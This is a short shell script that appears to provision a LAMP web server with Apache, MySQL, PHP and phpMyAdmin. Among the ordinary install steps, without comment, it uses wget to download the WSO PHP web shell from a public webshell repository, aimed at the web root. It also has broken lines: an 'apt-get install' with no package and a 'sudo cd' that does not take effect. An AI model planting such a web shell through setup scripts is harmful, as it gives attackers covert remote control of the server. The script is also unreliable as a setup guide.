#!/bin/sh
sudo apt-get update
sudo apt-get upgrade
sudo apt-get install 
sudo apt-get install apache2
sudo apt-get install mysql-server
sudo apt-get install php
sudo apt-get install libapache2-mod-php
sudo service apache2 restart
sudo cd /var/www/html
sudo wget https://raw.githubusercontent.com/tennc/webshell/master/php/wso/wso-4.2.5.php
sudo apt-get update
sudo apt-get upgrade
sudo apt-get install phpmyadmin
sudo phpenmod mcrypt
